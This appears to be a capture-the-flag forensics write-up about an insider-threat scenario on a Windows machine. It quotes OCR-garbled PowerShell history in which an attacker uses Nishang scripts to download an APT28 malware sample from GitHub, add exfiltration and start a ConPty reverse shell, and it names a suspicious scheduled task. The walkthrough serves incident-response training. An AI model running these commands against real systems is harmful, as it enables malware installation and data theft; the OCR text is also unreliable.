# who-done-it
> We might have an insider threat in our company. Help us to clarify this unconfortable situation.

## About the Challenge
We got a zip file called `who-was-it.zip` and the file contains some useful information about the victim pc such as PowerShell History / Device Information

## How to Solve?
There are 3 questions that we need to answer:

1. Identify the hostname of the compromised machine.

We can get the hostname information at `/SystemInfo/output.txt` file


[Image extracted text: SystemInfo
= output txt
1
2
Host
Name:
DESKTOP_VZVNNIV
3
0S Name:
Microsoft Windows
10 Home
4
0S Version:
10.0.19043
N/A Build 19043
5
0S Manufacturer:
Microsoft Corporation
6
0S Configuration:
Standalone Workstation
7
0S Build Type:
Multiprocessor Free
8
Registered
Owner:
plantatie- ro@gmail.com
9
Registered Organization:
10
Product
ID:
00326-10000-00000-AA353
11
Original Install Date:
11/8/2021,
2:44:39
AM
U
U
Fn
S
n]


2. Provide the name of the malware binary downloaded by the attacker on the compromised account.

If we check the PowerShell History command (Especially in `plant` user). In line 156-157, the attacker tried to download a file called `ZekaAPT28.bin`


[Image extracted text: 105
cu
Jdeskeup {isllalg-lllasteri
154
C: |UsersIplant | OneDrivel Desktopinishang-masterlUtility Download. psl
155
Download
156
Download
~u
https / github_cOm/mstfknn/malware-sample-Libraryl rawlmaster/APT28%20FancyBear/ZekaAPT28_bin
download. txt
157
Download
~u
https
[github_com/mstfknn/malware_sample_librarylrawlmaster
APT28820FancyBear /ZekaAPT28_bin
~f
ZekaAPT28.bin
download.txt
158
cat
Idown Load. txt
159
C:|UsersIplant | OneDrivelDesktopinishang-masterlUtilitylAdd-Exfiltration.psl
160
IActiveDirectory|
161
Add-Exfiltration
162
C ulcerslnlantl Onenrivel Desktonlnishano_masteri Ghellcl Tnvoke_ConPtvshe
Dct]


3. Which is the suspicious scheduled task created by the attacker on the system?

We can get the suspicious scheduled task at /scheduled_task/Windows/System32/Tasks file


[Image extracted text: Avast Software
Microsoft
= Avast Emergency Update
= CCleaner Update
 CCleanerSkipUAC
plant
= connect_to_server
GoogleUpdateTaskMachineCore
=
GoogleUpdateTaskMachineUA
= MicrosoftEdgeUpdateTaskMachineCore
= MicrosoftEdgeUpdateTaskMachineUA
= OneDrive Reporting Task-S-1-5-21-1786831910
OneDrive Standalone Update Task-S-1-5-21-178
= OneDrive Standalone Update Task-S-1-5-21-178]


```
Q1: DESKTOP-V2VNNIV
Q2: ZekaAPT28.bin
Q3: connect_to_server
```